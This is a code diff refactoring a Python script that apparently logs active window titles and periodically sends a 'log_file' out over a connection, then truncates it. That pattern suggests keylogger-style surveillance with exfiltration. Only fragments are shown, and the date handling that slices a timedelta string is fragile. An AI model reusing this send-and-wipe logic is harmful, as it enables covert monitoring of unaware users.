@@ -7,10 +7,8 @@ from pyautogui import getActiveWindowTitle
 from sys import setrecursionlimit
 
 # Check if it's time to send the log file
-day = getline("check_file", 1)
-month = getline("check_file", 2)
-day = int(day)
-month = int(month)
+day = int(getline("check_file", 1))
+month = int(getline("check_file", 2))
 year_today = int(date.today().year)
 last_check = date(year_today, month, day)
 
@@ -18,8 +16,7 @@ day_today = int(date.today().day)
 month_today = int(date.today().month)
 today = date(year_today, month_today, day_today)
     
-time = today - last_check
-time = str(time)
+time = str(today - last_check)
 check_time = int(time[0:1])
 if check_time != 0:
     time = int(time[0:2])
@@ -38,9 +35,7 @@ if check_time != 0:
         connection.quit()
 
         file = open('check_file', 'w')
-        day_today = str(day_today)
-        month_today = str(month_today)
-        file.writelines(day_today + "\n" + month_today)
+        file.writelines(str(day_today) + "\n" + str(month_today))
         file.close()
         file = open('log_file', 'r+')
         file.truncate(0)
